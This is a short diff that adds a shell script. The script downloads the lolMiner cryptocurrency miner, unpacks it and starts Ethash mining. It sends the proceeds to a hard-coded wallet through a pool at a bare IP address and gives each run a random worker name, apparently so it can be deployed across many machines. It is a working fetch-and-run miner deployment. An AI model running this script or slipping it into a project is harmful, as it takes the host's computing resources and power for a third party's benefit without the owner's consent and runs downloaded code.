@@ -1,0 +1,7 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.44/lolMiner_v1.44_Lin64.tar.gz
+
+tar -xvf lolMiner_v1.44_Lin64.tar.gz
+
+cd 1.44 
+
+./lolMiner --algo ETHASH --pool ssl://172.65.230.90:5555 --user 0x7C86A8aa5482c0e35f193187A57f0D659092e916.$(echo $(shuf -i 1-99999 -n 1)-RAM)
